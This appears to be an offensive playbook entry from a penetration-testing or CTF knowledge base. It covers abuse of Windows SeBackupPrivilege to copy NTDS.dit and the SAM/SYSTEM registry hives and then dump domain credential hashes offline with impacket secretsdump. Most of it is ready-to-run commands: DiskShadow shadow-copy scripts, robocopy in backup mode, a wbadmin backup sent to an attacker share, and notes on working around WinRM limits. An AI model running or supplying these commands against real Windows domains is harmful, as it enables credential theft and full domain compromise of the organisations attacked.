# SeBackupPrivilege → NTDS.dit / Hive Extraction

## When this applies

- Windows foothold; user is in `Backup Operators` or holds `SeBackupPrivilege` + `SeRestorePrivilege`.
- Goal: read any file (regardless of NTFS ACLs) via the backup API — including `NTDS.dit` for offline credential extraction.

## Technique

`SeBackupPrivilege` lets a non-admin bypass DACLs on **read** operations the kernel routes through the backup-semantics flag. Use DiskShadow VSS, wbadmin, or robocopy `/B` (backup mode).

## Steps

```bash
# Members of Backup Operators have SeBackupPrivilege + SeRestorePrivilege
# Allows reading ANY file regardless of NTFS ACLs via backup API

# Method 1: DiskShadow (interactive, from WinRM/RDP)
# Create script file:
echo "set context persistent nowriters" > shadow.txt
echo "add volume c: alias cdrive" >> shadow.txt
echo "create" >> shadow.txt
echo 'expose %cdrive% z:' >> shadow.txt
diskshadow /s shadow.txt
# Copy from shadow:
robocopy /b z:\windows\ntds . ntds.dit   # /b = backup mode (uses SeBackupPrivilege)
reg save HKLM\SYSTEM system.hive

# Method 2: wbadmin (no interactive prompt needed)
wbadmin start backup -backuptarget:\\attacker\share -include:c: -quiet
# Then extract ntds.dit from the backup

# Method 3: Remote via impacket (if you have the hash/password)
impacket-secretsdump -just-dc-ntlm 'domain/backup_user:pass@DC_IP'

# Offline extraction:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

## SeBackupPrivilege — Simple File Read (when you just need one file, not full NTDS dump)

```bash
# robocopy /B bypasses ACLs using backup semantics -- simplest method for reading individual files
robocopy C:\Users\Administrator\Desktop C:\Users\current_user\Desktop root.txt /B
type C:\Users\current_user\Desktop\root.txt

# Works for any file: SAM, SYSTEM, SECURITY hives, configs, etc.
robocopy C:\Windows\System32\config C:\temp SAM SYSTEM SECURITY /B
```

## SeBackupPrivilege over WinRM — Real Limits

A common follow-on path. `SeBackupPrivilege` lets a non-admin bypass DACLs on **read** operations the kernel routes through the backup-semantics flag — **not** all of them.

- `reg save HKLM\SAM <out>` ✓ (works over WinRM)
- `reg save HKLM\SYSTEM <out>` ✓
- `reg save HKLM\SECURITY <out>` ✗ (lsass holds an exclusive open — denied)
- `robocopy /B C:\Windows\NTDS . ntds.dit` ✗ (`/B` does not bypass exclusive locks; ntds.dit is held open by NTDS service)
- VSS via `diskshadow.exe /s script.txt` ✗ (`InitializeForBackup` requires actual admin, not just SeBackupPrivilege; the WinRM token filter blocks it)
- **DSRM != Domain Admin** — the local Administrator hash extracted from a DC's SAM hive is the **DSRM** (Directory Services Restore Mode) admin. It does NOT authenticate against the domain over SMB/WinRM/LDAP. Don't waste cycles PtH-ing it; pivot to ImagePath instead (see `server-operators-imagepath.md`).

## Verifying success

- Method 1 produces `ntds.dit` + `system.hive` you can run secretsdump.py against.
- Method 3 produces user:RID:LM:NT lines for every domain user.

## Common pitfalls

- `SECURITY` hive is held by lsass — `reg save` fails. Use SAM/SYSTEM only over WinRM.
- ntds.dit is held by NTDS service — robocopy `/B` won't read it directly. Use VSS shadow copy first.
- Backup Operators membership over WinRM has UAC token filtering — many SCM operations fail. See `server-operators-imagepath.md` for the durable path.

## Tools

- diskshadow
- robocopy (`/B`)
- wbadmin
- impacket `secretsdump.py`
- reg save
